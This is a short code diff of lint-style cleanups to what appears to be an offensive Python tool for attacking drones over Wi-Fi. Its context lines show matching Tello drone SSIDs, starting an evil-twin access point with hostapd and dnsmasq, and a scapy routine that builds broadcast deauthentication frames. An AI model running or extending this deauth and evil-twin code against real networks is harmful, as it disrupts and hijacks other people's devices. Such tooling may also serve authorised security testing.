@@ -46,7 +46,6 @@ import os
 import re
 import shutil
 import signal
-import socket
 import subprocess
 import sys
 import tempfile
@@ -57,8 +56,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parent / "exploit_chains"))
-from common import ChainLogger, AbortHandler
-
+from common import AbortHandler, ChainLogger
 
 DRONE_SSID_PATTERNS = [
     (r"^TELLO-[A-Z0-9]+$", "tello", "Ryze Tello"),
@@ -290,7 +288,7 @@ def start_evil_twin(state: EvilTwinState, logger: ChainLogger,
         logger.dry_run("AP", f"Would write hostapd.conf:\n{state.hostapd_conf}")
         logger.dry_run("AP", f"Would write dnsmasq.conf:\n{state.dnsmasq_conf}")
         logger.dry_run("AP", f"Would start hostapd on {state.interface}")
-        logger.dry_run("AP", f"Would start dnsmasq DHCP server")
+        logger.dry_run("AP", "Would start dnsmasq DHCP server")
         return True
 
     with open(hostapd_path, "w") as f:
@@ -362,7 +360,7 @@ def deauth_clients(bssid: str, interface: str, count: int,
 def _deauth_scapy(bssid: str, interface: str, count: int, logger: ChainLogger):
     """Fallback deauth using scapy."""
     try:
-        from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+        from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
         pkt = RadioTap() / Dot11(
             addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid
         ) / Dot11Deauth(reason=7)
